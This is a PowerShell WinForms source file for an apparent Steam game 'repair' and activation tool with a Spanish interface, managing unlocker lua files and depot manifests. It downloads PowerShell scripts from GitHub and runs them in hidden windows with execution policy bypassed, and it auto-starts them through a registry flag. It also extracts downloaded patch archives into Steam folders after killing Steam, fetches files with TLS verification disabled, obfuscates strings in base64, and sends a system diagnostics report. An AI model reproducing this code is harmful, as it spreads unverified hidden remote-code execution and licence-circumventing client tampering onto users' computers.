$script:sAutoLua.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:sAutoLua.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:sAutoLua.Add_Paint({param($s,$e)
 $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
 $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
 $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
 $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
 $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
 $on=$script:autoLuaWatcherEnabled
 $st=if($on){"Reparar descargar 1: ACTIVADO"}else{"Reparar descargar 1: DESACTIVADO"}
 $tw=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($st,$script:FntCard,$tw,14,7);$tw.Dispose()
 $sub=if($on){""}else{"Click para activar"}
 $sw=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($sub,$script:FntSub,$sw,14,27);$sw.Dispose()
 $clr=if($on){$script:Green}else{$script:Red}
 $dot=New-Object System.Drawing.SolidBrush($clr);$g.FillEllipse($dot,($s.Width-24),16,10,10);$dot.Dispose()
})
$script:sAutoLua.Add_Click({
 $script:autoLuaWatcherEnabled=-not $script:autoLuaWatcherEnabled
 try { New-Item -Path "HKCU:\Software\Bsmap" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoLuaWatcher -Value ([int]$script:autoLuaWatcherEnabled) -Type DWord -Force } catch {}
 if($script:autoLuaWatcherEnabled){
  try{
   $baseLocal=$env:LOCALAPPDATA; if([string]::IsNullOrWhiteSpace($baseLocal)){ $baseLocal=Join-Path $env:USERPROFILE "AppData\Local" }
   $watcherPath=$null; if(-not [string]::IsNullOrWhiteSpace($PSScriptRoot)){ $watcherPath=Join-Path $PSScriptRoot "watcher_luatools.ps1" }
   if([string]::IsNullOrWhiteSpace($watcherPath) -or -not (Test-Path $watcherPath)){ $watcherPath=Join-Path $baseLocal "BastissSteam\watcher_luatools.ps1" }
   if(-not (Test-Path $watcherPath)){
     try {
       $dir=Split-Path $watcherPath; if([string]::IsNullOrWhiteSpace($dir)){$dir=$baseLocal}
       New-Item -ItemType Directory -Path $dir -Force | Out-Null
       Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/watcher_luatools.ps1" -OutFile $watcherPath -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
     } catch {}
   }
   if(-not (Test-Path $watcherPath)){ throw "No se pudo obtener watcher_luatools.ps1 en $watcherPath" }
   $psi=New-Object System.Diagnostics.ProcessStartInfo
   $psi.FileName="powershell.exe"
   $psi.Arguments="-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watcherPath`""
   $psi.WindowStyle="Hidden";$psi.CreateNoWindow=$true;$psi.UseShellExecute=$false
   $script:autoLuaWatcherProcess=[System.Diagnostics.Process]::Start($psi)
  }catch{
   $script:autoLuaWatcherEnabled=$false
   try { Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoLuaWatcher -Value 0 -Type DWord -Force } catch {}
   [System.Windows.Forms.MessageBox]::Show("No se pudo iniciar Reparar descargar 1: $($_.Exception.Message)","Reparar descargar 1","OK","Error") | Out-Null
   $script:sAutoLua.Invalidate()
   return
  }
  [System.Windows.Forms.MessageBox]::Show("REPARAR DESCARGAR 1 FUNCIONANDO CORRECTAMENTE","Reparar descargar 1","OK","Information") | Out-Null
 } else {
  try{ if($script:autoLuaWatcherProcess -and -not $script:autoLuaWatcherProcess.HasExited){ $script:autoLuaWatcherProcess.Kill() } }catch{}
  try{ Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object { $_.CommandLine -match "watcher_luatools.ps1" } | ForEach-Object { try{ Stop-Process -Id $_.ProcessId -Force }catch{} } }catch{}
  $script:autoLuaWatcherProcess=$null
  [System.Windows.Forms.MessageBox]::Show("Reparar descargar 1 desactivado.","Reparar descargar 1","OK","Information") | Out-Null
 }
 $script:sAutoLua.Invalidate()
})
$script:sp.Controls.Add($script:sAutoLua)
# auto-start Reparar descargar 1 if enabled
if($script:autoLuaWatcherEnabled){
 try{
  $baseLocal2=$env:LOCALAPPDATA; if([string]::IsNullOrWhiteSpace($baseLocal2)){ $baseLocal2=Join-Path $env:USERPROFILE "AppData\Local" }
  $watcherPath= $null; if(-not [string]::IsNullOrWhiteSpace($PSScriptRoot)){ $watcherPath=Join-Path $PSScriptRoot "watcher_luatools.ps1" }
  if([string]::IsNullOrWhiteSpace($watcherPath) -or -not (Test-Path $watcherPath)){ $watcherPath=Join-Path $baseLocal2 "BastissSteam\watcher_luatools.ps1" }
  if(-not (Test-Path $watcherPath)){
    try {
      $dir2=Split-Path $watcherPath; if([string]::IsNullOrWhiteSpace($dir2)){$dir2=$baseLocal2}
      New-Item -ItemType Directory -Path $dir2 -Force | Out-Null
      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/watcher_luatools.ps1" -OutFile $watcherPath -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
    } catch {}
  }
  if(Test-Path $watcherPath){
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName="powershell.exe"
    $psi.Arguments="-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watcherPath`""
    $psi.WindowStyle="Hidden";$psi.CreateNoWindow=$true;$psi.UseShellExecute=$false
    $script:autoLuaWatcherProcess=[System.Diagnostics.Process]::Start($psi)
  }
 }catch{}
}
$script:autoDropsV2Process=$null
$script:autoDropsV2Enabled=$false
try { $v=Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoDropsV2 -ErrorAction SilentlyContinue; if($v -ne $null){ $script:autoDropsV2Enabled=[bool][int]$v.AutoDropsV2 } } catch {}
$script:sDropsV2=New-BufferedPanel
$script:sDropsV2.Location=New-Object System.Drawing.Point($PAD,($sY+174))
$script:sDropsV2.Size=New-Object System.Drawing.Size($CW,50);$script:sDropsV2.BackColor=$BG
$script:sDropsV2.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sDropsV2.Tag=@{Hover=$false}
$script:sDropsV2.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:sDropsV2.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:sDropsV2.Add_Paint({param($s,$e)
 $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
 $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
 $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
 $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
 $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
 $on=$script:autoDropsV2Enabled
 $st=if($on){"Reparar descargar 2: ACTIVADO"}else{"Reparar descargar 2: DESACTIVADO"}
 $tw=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($st,$script:FntCard,$tw,14,7);$tw.Dispose()
 $sub=if($on){""}else{"Click para activar"}
 $sw=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($sub,$script:FntSub,$sw,14,27);$sw.Dispose()
 $clr=if($on){$script:Green}else{$script:Red}
 $dot=New-Object System.Drawing.SolidBrush($clr);$g.FillEllipse($dot,($s.Width-24),16,10,10);$dot.Dispose()
})
$script:sDropsV2.Add_Click({
 $script:autoDropsV2Enabled=-not $script:autoDropsV2Enabled
 try { New-Item -Path "HKCU:\Software\Bsmap" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoDropsV2 -Value ([int]$script:autoDropsV2Enabled) -Type DWord -Force } catch {}
 if($script:autoDropsV2Enabled){
  try{
   $baseLocal=$env:LOCALAPPDATA; if([string]::IsNullOrWhiteSpace($baseLocal)){ $baseLocal=Join-Path $env:USERPROFILE "AppData\Local" }
   $watcherPath=$null; if(-not [string]::IsNullOrWhiteSpace($PSScriptRoot)){ $watcherPath=Join-Path $PSScriptRoot "watcher_dropsv2.ps1" }
   if([string]::IsNullOrWhiteSpace($watcherPath) -or -not (Test-Path $watcherPath)){ $watcherPath=Join-Path $baseLocal "BastissSteam\watcher_dropsv2.ps1" }
   if(-not (Test-Path $watcherPath)){
     try {
       $dir=Split-Path $watcherPath; if([string]::IsNullOrWhiteSpace($dir)){$dir=$baseLocal}
       New-Item -ItemType Directory -Path $dir -Force | Out-Null
       Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/watcher_dropsv2.ps1" -OutFile $watcherPath -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
     } catch {}
   }
   if(-not (Test-Path $watcherPath)){ throw "No se pudo obtener watcher_dropsv2.ps1 en $watcherPath" }
   $psi=New-Object System.Diagnostics.ProcessStartInfo
   $psi.FileName="powershell.exe"
   $psi.Arguments="-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watcherPath`""
   $psi.WindowStyle="Hidden";$psi.CreateNoWindow=$true;$psi.UseShellExecute=$false
   $script:autoDropsV2Process=[System.Diagnostics.Process]::Start($psi)
  }catch{
   $script:autoDropsV2Enabled=$false
   try { Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoDropsV2 -Value 0 -Type DWord -Force } catch {}
   [System.Windows.Forms.MessageBox]::Show("No se pudo iniciar Reparar descargar 2: $($_.Exception.Message)","Reparar descargar 2","OK","Error") | Out-Null
   $script:sDropsV2.Invalidate()
   return
  }
  [System.Windows.Forms.MessageBox]::Show("REPARAR DESCARGAR 2 FUNCIONANDO CORRECTAMENTE","Reparar descargar 2","OK","Information") | Out-Null
 } else {
  try{ if($script:autoDropsV2Process -and -not $script:autoDropsV2Process.HasExited){ $script:autoDropsV2Process.Kill() } }catch{}
  try{ Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object { $_.CommandLine -match "watcher_dropsv2.ps1" } | ForEach-Object { try{ Stop-Process -Id $_.ProcessId -Force }catch{} } }catch{}
  $script:autoDropsV2Process=$null
  [System.Windows.Forms.MessageBox]::Show("Reparar descargar 2 desactivado.","Reparar descargar 2","OK","Information") | Out-Null
 }
 $script:sDropsV2.Invalidate()
})
$script:sp.Controls.Add($script:sDropsV2)
# auto-start Reparar descargar 2 if enabled
if($script:autoDropsV2Enabled){
 try{
  $baseLocal2=$env:LOCALAPPDATA; if([string]::IsNullOrWhiteSpace($baseLocal2)){ $baseLocal2=Join-Path $env:USERPROFILE "AppData\Local" }
  $watcherPath= $null; if(-not [string]::IsNullOrWhiteSpace($PSScriptRoot)){ $watcherPath=Join-Path $PSScriptRoot "watcher_dropsv2.ps1" }
  if([string]::IsNullOrWhiteSpace($watcherPath) -or -not (Test-Path $watcherPath)){ $watcherPath=Join-Path $baseLocal2 "BastissSteam\watcher_dropsv2.ps1" }
  if(-not (Test-Path $watcherPath)){
    try {
      $dir2=Split-Path $watcherPath; if([string]::IsNullOrWhiteSpace($dir2)){$dir2=$baseLocal2}
      New-Item -ItemType Directory -Path $dir2 -Force | Out-Null
      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/watcher_dropsv2.ps1" -OutFile $watcherPath -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
    } catch {}
  }
  if(Test-Path $watcherPath){
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName="powershell.exe"
    $psi.Arguments="-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watcherPath`""
    $psi.WindowStyle="Hidden";$psi.CreateNoWindow=$true;$psi.UseShellExecute=$false
    $script:autoDropsV2Process=[System.Diagnostics.Process]::Start($psi)
  }
 }catch{}
}


function Merge-RepairGithub {
    try {
        $g2 = $script:repairGames; if (-not $g2) { return }
        $f2 = $script:repairFixes; if (-not $f2) { return }
        if (-not $script:repairCustomRoot -or -not (Test-Path $script:repairCustomRoot)) { return }
        $gh2 = @($script:repairGithub)
        foreach ($fk in $f2.Keys) {
            if ($fk -match '\.') { continue }
            $dup = $false
            foreach ($g in $g2.Keys) { if ((Nn1Yw $g) -eq (Nn1Yw $fk)) { $dup = $true; break } }
            if (-not $dup) { $g2[$fk] = $script:repairCustomRoot; if ($gh2 -notcontains $fk) { $gh2 += $fk } }
        }
        $script:repairGames = $g2
        $script:repairGithub = $gh2
    } catch {}
}
function Refresh-RepairRows {
    try { $lvR = $script:repairLv; if (-not $lvR -or $lvR.IsDisposed) { return 0 } } catch { return 0 }
    $gamesR = @{}; try { $gamesR = $script:repairGames; if (-not $gamesR) { $gamesR = @{} } } catch { $gamesR = @{} }
    $fixesR = @{}; try { $fixesR = $script:repairFixes; if (-not $fixesR) { $fixesR = @{} } } catch { $fixesR = @{} }
    $ghR = @(); try { $ghR = @($script:repairGithub) } catch {}
    $noGameFolders = @('Steamworks Shared','Steam Controller Configs')
    $timersR = @(); try { $timersR = At5Vc } catch {}
    $libsR = @(); try { $libsR = Ss3Jd } catch {}
    $diskLuasR = @{}
    foreach ($lib in $libsR) {
        foreach ($sub in @('config\stplug-in','config\lua')) {
            $d = Join-Path $lib $sub
            if (Test-Path $d) { Get-ChildItem "$d\*.lua" -ErrorAction SilentlyContinue | ForEach-Object { $diskLuasR[$_.Name] = $true } }
        }
    }
    $rowsR = @()
    foreach ($name in $gamesR.Keys) {
        try {
        if ($noGameFolders -contains $name) { continue }
        $fixName,$fixUrl = Ff2Xa $name $fixesR
        $hasFix = (-not [string]::IsNullOrEmpty($fixUrl))
        $timer = $null
        foreach ($t in $timersR) { if ($t.game_name -eq $name) { $timer = $t; break } }
        $needRepair = $false
        if ($timer -and @($timer.lua_files).Count -gt 0) {
            $missing = @($timer.lua_files | Where-Object { -not $diskLuasR.ContainsKey($_) })
            $needRepair = $missing.Count -gt 0
        } else {
            $gNorm = Nn1Yw $name
            $anyMatch = $false
            foreach ($ln in $diskLuasR.Keys) {
                $lNorm = Nn1Yw ([System.IO.Path]::GetFileNameWithoutExtension($ln))
                if ($lNorm -eq $gNorm -or $lNorm -like "*$gNorm*" -or $gNorm -like "*$lNorm*") { $anyMatch = $true; break }
            }
            $needRepair = -not $anyMatch
        }
        $src = 'disk'; if ($ghR -contains $name) { $src = 'github' }
        $rowsR += [PSCustomObject]@{ Game=$name; Path=$gamesR[$name]; FixName=$fixName; FixUrl=$fixUrl; NeedRepair=($needRepair -and $hasFix); HasFix=$hasFix; Src=$src }
        } catch {}
    }
    $lvR.Items.Clear()
    foreach ($r in $rowsR) {
        $item = New-Object System.Windows.Forms.ListViewItem($r.Game)
        $item.SubItems.Add($(if($r.NeedRepair){(S("UmVxdWllcmUgcmVwYXJhY2lvbg=="))}elseif(-not $r.HasFix){"No requiere reparacion"}else{"OK"}))|Out-Null
        $item.Tag=$r
        $item.Checked=($r.NeedRepair -and $r.Src -ne 'github')
        $lvR.Items.Add($item)|Out-Null
    }
    return $rowsR.Count
}
function Mn3Vp {
    try {
        $fixes = Qw7Rt
        if (-not $fixes -or $fixes.Count -eq 0) {
            [System.Windows.Forms.MessageBox]::Show((S("Tm8gc2UgcHVkbyBvYnRlbmVyIGxhIGxpc3RhIGRlIHJlcGFyYWNpb25lcy4gUmV2aXNhIHR1IGNvbmV4aW9uLg==")),(S("UmVwYXJhZG9yIGRlIGp1ZWdvcw==")),"OK","Warning")
            return
        }
        $games = Ii5Hb
        $noGameFolders = @('Steamworks Shared','Steam Controller Configs')
        $timers = At5Vc
        $libs = Ss3Jd
        $diskLuas = @{}
        foreach ($lib in $libs) {
            foreach ($sub in @('config\stplug-in','config\lua')) {
                $d = Join-Path $lib $sub
                if (Test-Path $d) { Get-ChildItem "$d\*.lua" -ErrorAction SilentlyContinue | ForEach-Object { $diskLuas[$_.Name] = $true } }
            }
        }
        $rows = @()
        if ($script:repairCustomRoot -and (Test-Path $script:repairCustomRoot)) {
            Get-ChildItem -LiteralPath $script:repairCustomRoot -Directory -ErrorAction SilentlyContinue | ForEach-Object { if (-not $games.ContainsKey($_.Name)) { $games[$_.Name] = $_.FullName } }
        }
        $script:repairGames = $games
        $script:repairFixes = $fixes
        $script:repairGithub = @()
        Merge-RepairGithub
        $dlg = New-Object System.Windows.Forms.Form
        $dlg.Text=(S("UmVwYXJhZG9yIGRlIGp1ZWdvcw=="))
        $dlg.ClientSize=New-Object System.Drawing.Size(560,420)
        $dlg.StartPosition="CenterScreen";$dlg.BackColor=$script:BG
        $dlg.FormBorderStyle="FixedSingle";$dlg.MaximizeBox=$false
        $lbl = New-Object System.Windows.Forms.Label
        $lbl.Text=(S("SnVlZ29zIGluc3RhbGFkb3MgeSBhY3RpdmFkb3MgY29uIHJlcGFyYWNpb24gZGlzcG9uaWJsZSAodGlsZGFkb3MgPSByZXF1aWVyZW4gcmVwYXJhY2lvbik6"))
        $lbl.Font=$script:FntCard;$lbl.ForeColor=$script:White;$lbl.BackColor=$script:BG
        $lbl.Location=New-Object System.Drawing.Point(12,10);$lbl.AutoSize=$true
        $dlg.Controls.Add($lbl)
        $txtPath = New-Object System.Windows.Forms.TextBox
        $txtPath.Location=New-Object System.Drawing.Point(12,32)
        $txtPath.Size=New-Object System.Drawing.Size(420,22)
        $txtPath.ReadOnly=$true
        $txtPath.BackColor=$script:InputBG;$txtPath.ForeColor=$script:White
        $txtPath.BorderStyle="FixedSingle"
        if ($script:repairCustomRoot) { $txtPath.Text=$script:repairCustomRoot }
        $dlg.Controls.Add($txtPath)
        $btnPath = New-Object System.Windows.Forms.Button
        $btnPath.Location=New-Object System.Drawing.Point(440,30)
        $btnPath.Size=New-Object System.Drawing.Size(108,24)
        $btnPath.Text="Examinar..."
        $btnPath.BackColor=$script:CardBG;$btnPath.ForeColor=$script:White
        $btnPath.FlatStyle="Flat"
        $btnPath.Add_Click({
            $fb = New-Object System.Windows.Forms.FolderBrowserDialog
            $fb.Description="Elegi la carpeta donde estan los juegos"
            if ($fb.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
                try {
                $script:repairCustomRoot = $fb.SelectedPath
                $txtPath.Text = $script:repairCustomRoot
                try {
                    $g2 = $script:repairGames; if (-not $g2) { $g2 = @{} }
                    Get-ChildItem -LiteralPath $script:repairCustomRoot -Directory -ErrorAction SilentlyContinue | ForEach-Object { if (-not $g2.ContainsKey($_.Name)) { $g2[$_.Name] = $_.FullName } }
                    $script:repairGames = $g2
                } catch {}
                Merge-RepairGithub
                Refresh-RepairRows | Out-Null
                } catch { try { $st.Text="Error al leer la carpeta."; $st.ForeColor=$script:Red } catch {} }
            }
            $fb.Dispose()
        })
        $dlg.Controls.Add($btnPath)
        $lv = New-Object System.Windows.Forms.ListView
        $lv.Location=New-Object System.Drawing.Point(12,60)
        $lv.Size=New-Object System.Drawing.Size(536,272)
        $lv.View="Details";$lv.CheckBoxes=$true;$lv.FullRowSelect=$true
        $lv.BackColor=$script:InputBG;$lv.ForeColor=$script:White
        $lv.BorderStyle="FixedSingle"
        $lv.Columns.Add("Juego",300)|Out-Null
        $lv.Columns.Add("Estado",220)|Out-Null
        $script:repairLv = $lv
        if ((Refresh-RepairRows) -eq 0) {
            [System.Windows.Forms.MessageBox]::Show("No hay juegos para reparar.",(S("UmVwYXJhZG9yIGRlIGp1ZWdvcw==")),"OK","Information")
            $dlg.Dispose()
            return
        }
        $dlg.Controls.Add($lv)
        $st = New-Object System.Windows.Forms.Label
        $st.Text=""
        $st.Font=$script:FntSub;$st.ForeColor=$script:Yellow;$st.BackColor=$script:BG
        $st.Location=New-Object System.Drawing.Point(12,342);$st.Size=New-Object System.Drawing.Size(536,18)
        $dlg.Controls.Add($st)
        $pb = New-Object System.Windows.Forms.ProgressBar
        $pb.Location=New-Object System.Drawing.Point(12,366)
        $pb.Size=New-Object System.Drawing.Size(340,20)
        $dlg.Controls.Add($pb)
        $btnRep = New-Object System.Windows.Forms.Button
        $btnRep.Location=New-Object System.Drawing.Point(360,364)
        $btnRep.Size=New-Object System.Drawing.Size(188,24)
        $btnRep.Text=(S("UmVwYXJhciBzZWxlY2Npb25hZG9z"))
        $btnRep.BackColor=$script:CardBG;$btnRep.ForeColor=$script:White
        $btnRep.FlatStyle="Flat"
        $dlg.Controls.Add($btnRep)
        $btnRep.Add_Click({
            $sel = @($lv.Items | Where-Object { $_.Checked })
            if ($sel.Count -eq 0) { return }
            $btnRep.Enabled=$false
            $i=0
            foreach ($it in $sel) {
                $i++
                $r=$it.Tag
                if (-not $r.FixUrl) { $it.SubItems[1].Text="No requiere reparacion"; continue }
                $st.Text="($i/$($sel.Count)) Buscando reparacion..."
                $st.ForeColor=$script:Yellow
                $pb.Style="Marquee"; $pb.MarqueeAnimationSpeed=30
                $pb.Value=0
                [System.Windows.Forms.Application]::DoEvents()
                $zip = Join-Path $env:TEMP "repair_$(Get-Random).zip"
                try {
                    $crR = Invoke-CurlHidden @('-s','-k','-L','--ssl-no-revoke','-H','User-Agent: Mozilla/5.0','-o',$zip,$r.FixUrl,'--max-time','300') 300
                    if ($crR.exit -ne 0) { throw "descarga fallida" }
                    $pb.Style="Continuous"; $pb.MarqueeAnimationSpeed=0
                    if (-not (Test-Path $zip) -or (Get-Item $zip).Length -eq 0) { throw "Descarga vacia" }
                    $st.Text="($i/$($sel.Count)) Reparacion disponible, reparando $($r.Game)..."
                    [System.Windows.Forms.Application]::DoEvents()
                    if (-not (Test-Path $r.Path)) { throw "No se encontro la carpeta de instalacion de $($r.Game)" }
                    $er = @()
                    try {
                        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
                        $z2 = [System.IO.Compression.ZipFile]::OpenRead($zip)
                        foreach ($e2 in $z2.Entries) { if ($e2.Name) { $er += $e2.FullName } }
                        $z2.Dispose()
                    } catch {}
                    Expand-Archive -Path $zip -DestinationPath $r.Path -Force
                    Remove-Item $zip -Force -ErrorAction SilentlyContinue
                    if ($er.Count -gt 0) { Am3Fs $r.Game $r.Path $er }
                    Aw8Nq $r.Game
                    $it.SubItems[1].Text="Reparado"
                    $st.Text="($i/$($sel.Count)) $($r.Game) reparado."
                    $st.ForeColor=$script:Green
                } catch {
                    Remove-Item $zip -Force -ErrorAction SilentlyContinue
                    $it.SubItems[1].Text="Error"
                    $st.Text="($i/$($sel.Count)) No se pudo reparar $($r.Game)."
                    $st.ForeColor=$script:Red
                }
                $pb.Style="Continuous"; $pb.MarqueeAnimationSpeed=0
                $pb.Value=100
                [System.Windows.Forms.Application]::DoEvents()
            }
            $st.Text="Listo: $($sel.Count) juegos procesados."
            $st.ForeColor=$script:Green
            $btnRep.Enabled=$true
        })
        $dlg.ShowDialog() | Out-Null
        $dlg.Dispose()
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Error en el reparador de juegos: $($_.Exception.Message)",(S("UmVwYXJhZG9yIGRlIGp1ZWdvcw==")),"OK","Error")
    }
}
$script:sRepair=New-CfgBtn $sY (S("UmVwYXJhZG9yIGRlIGp1ZWdvcw==")) "Compara los juegos instalados con los activados" { Mn3Vp }
$script:sp.Controls.Add($script:sRepair)

$script:sDiag=New-Object System.Windows.Forms.Button
$script:sDiag.Text="DIAGNOSTICAR  *  Enviar reporte del sistema"
$script:sDiag.Location=New-Object System.Drawing.Point($PAD,($sY+232))
$script:sDiag.Size=New-Object System.Drawing.Size($CW,50)
$script:sDiag.BackColor=$script:CardBG;$script:sDiag.ForeColor=$script:White
$script:sDiag.FlatStyle="Flat"
$script:sDiag.FlatAppearance.BorderColor=$script:Cyan
$script:sDiag.Font=$script:FntCard
$script:sDiag.Cursor=[System.Windows.Forms.Cursors]::Hand
$script:sDiag.TextAlign=[System.Drawing.ContentAlignment]::MiddleCenter
$script:sDiag.Add_Click({
    $script:sDiag.Enabled=$false
    $script:sDiag.Text="Enviando..."
    [System.Windows.Forms.Application]::DoEvents()
    Send-Diagnostics
    $script:sDiag.Text="Enviado"
    Start-Sleep -Milliseconds 1500
    $script:sDiag.Text="DIAGNOSTICAR"
    $script:sDiag.Enabled=$true
})
function Expand-PatchZip {
    param([string]$zip,[string]$root)
    $locked=@()
    try { Get-Process steam,steamwebhelper,steamservice -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
    Start-Sleep -Milliseconds 1200
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
    $arch=[System.IO.Compression.ZipFile]::OpenRead($zip)
    try {
        foreach($entry in $arch.Entries){
            $rel=$entry.FullName.TrimStart('/','\')
            if([string]::IsNullOrWhiteSpace($rel) -or $entry.FullName.EndsWith('/') -or $entry.FullName.EndsWith('\')){ continue }
            $full=Join-Path $root $rel
            $dir=[System.IO.Path]::GetDirectoryName($full)
            if($dir -and -not (Test-Path -LiteralPath $dir)){ New-Item -ItemType Directory -Path $dir -Force | Out-Null }
            $done=$false
            for($t=1;$t -le 4 -and -not $done;$t++){
                try { [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry,$full,$true); $done=$true }
                catch {
                    if($t -lt 4){
                        try { Get-Process steam,steamwebhelper,steamservice -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
                        Start-Sleep -Milliseconds 1500
                    }
                }
            }
            if(-not $done){ $locked+=$full }
        }
    } finally { $arch.Dispose() }
    try { $wmE=Join-Path $root 'winmm.dll'; if(Test-Path -LiteralPath $wmE){ Remove-Item -LiteralPath $wmE -Force -ErrorAction SilentlyContinue } } catch {}
    return ,$locked
}
function Repair-Activacion2 {
    try {
        $steamRoots=@()
        try { $main=Get-SteamPath; if($main){ $steamRoots+= $main } } catch {}
        try {
            $libFiles=@(Join-Path $main "steamapps\libraryfolders.vdf"), (Join-Path $main "config\libraryfolders.vdf"), (Join-Path $main "libraryfolders.vdf")
            foreach($lf in $libFiles){
                if(Test-Path $lf){
                    $txt=Get-Content -LiteralPath $lf -Raw -ErrorAction SilentlyContinue
                    foreach($m in [regex]::Matches($txt, '"path"\s+"([^"]+)"')){
                        $p=$m.Groups[1].Value -replace '\\\\','\'
                        if($p -and (Test-Path $p) -and $steamRoots -notcontains $p){ $steamRoots+= $p }
                    }
                    foreach($m in [regex]::Matches($txt, '"\d+"\s+"([^"]+)"')){
                        $p=$m.Groups[1].Value -replace '\\\\','\'
                        if($p -and (Test-Path (Join-Path $p "steam.exe")) -and $steamRoots -notcontains $p){ $steamRoots+= $p }
                    }
                }
            }
        } catch {}
        $steamRoots=$steamRoots | Sort-Object -Unique | Where-Object { $_ -and (Test-Path $_) }
        if($steamRoots.Count -eq 0){ [System.Windows.Forms.MessageBox]::Show("No se encontraron rutas de Steam.","Solucionar activacion 2","OK","Error"); return }
        $zipUrl="https://github.com/bastisayes/Fixes-steam/releases/download/bastisss/parche_nuevo.zip"
        $tmpZip=Join-Path $env:TEMP "parche2_$(Get-Random).zip"
        try { (New-Object System.Net.WebClient).DownloadFile($zipUrl, $tmpZip) } catch { try { Invoke-WebRequest -Uri $zipUrl -OutFile $tmpZip -UseBasicParsing -TimeoutSec 60 } catch { [System.Windows.Forms.MessageBox]::Show("No se pudo descargar el componente: $($_.Exception.Message)","Solucionar activacion 2","OK","Error"); return } }
        if(-not (Test-Path $tmpZip) -or ((Get-Item $tmpZip).Length -lt 1000)){ [System.Windows.Forms.MessageBox]::Show("Descarga incompleta.","Solucionar activacion 2","OK","Error"); return }
        foreach($sr in $steamRoots){
            try {
                $lockedZ = Expand-PatchZip -zip $tmpZip -root $sr
                if($lockedZ.Count -gt 0){ [System.Windows.Forms.MessageBox]::Show("Cerra Steam y los juegos y reintenta. Archivos en uso:`n" + (($lockedZ | Select-Object -First 8) -join "`n"),"Solucionar activacion 2","OK","Warning") }
            } catch { [System.Windows.Forms.MessageBox]::Show("No se pudo extraer a $sr`n$($_.Exception.Message)","Solucionar activacion 2","OK","Error"); continue }
        }
        Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue
        if($steamRoots.Count -gt 1){
            $allLuas=@{}; $allMans=@{}
            foreach($sr in $steamRoots){
                $luas=@(Get-ChildItem -LiteralPath (Join-Path $sr "config\lua") -Filter *.lua -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                $luas+=@(Get-ChildItem -LiteralPath (Join-Path $sr "config\stplug-in") -Filter *.lua -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                foreach($l in $luas){ if(-not $allLuas.ContainsKey($l)){ $allLuas[$l]=@() }; $allLuas[$l]+= $sr }
                $mans=@(Get-ChildItem -LiteralPath (Join-Path $sr "config\depotcache") -Filter *.manifest -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                $mans+=@(Get-ChildItem -LiteralPath (Join-Path $sr "depotcache") -Filter *.manifest -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                foreach($m in $mans){ if(-not $allMans.ContainsKey($m)){ $allMans[$m]=@() }; $allMans[$m]+= $sr }
            }
            foreach($kv in $allLuas.GetEnumerator()){
                $f=$kv.Key; $have=$kv.Value | Sort-Object -Unique
                $missing=$steamRoots | Where-Object { $have -notcontains $_ }
                foreach($dst in $missing){
                    $src=$have | Select-Object -First 1
                    $srcFile=@(Get-ChildItem -LiteralPath (Join-Path $src "config\lua") -Filter $f -ErrorAction SilentlyContinue | Select-Object -First 1), (Get-ChildItem -LiteralPath (Join-Path $src "config\stplug-in") -Filter $f -ErrorAction SilentlyContinue | Select-Object -First 1) | Where-Object { $_ } | Select-Object -First 1
                    if($srcFile){
